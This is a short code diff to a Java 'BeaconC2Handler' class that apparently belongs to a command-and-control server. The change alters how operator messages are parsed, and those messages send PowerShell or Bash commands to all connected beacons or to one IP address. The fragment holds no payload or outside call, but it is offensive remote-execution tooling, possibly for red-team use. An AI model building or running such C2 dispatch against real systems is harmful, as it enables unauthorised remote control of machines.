@@ -88,10 +88,10 @@ public class BeaconC2Handler implements Runnable{
                 if(tokens[0].equals("quit")){
                     break;
                 }
-                if(verb.equals("Command")){
-                    // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address] [Powershell/Bash command to be run]"
-                    if(target.equals("All")){
-                        beaconServer.distributeCommands(scope, commands);
+                if(tokens[0].equals("Command")){
+                    // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address]_[Powershell/Bash command to be run]"
+                    if(tokens[2].equals("All")){
+                        beaconServer.distributeCommands(tokens[1], commands);
                     } else {
                         beaconServer.distributeCommands(scope, commands);
                     }
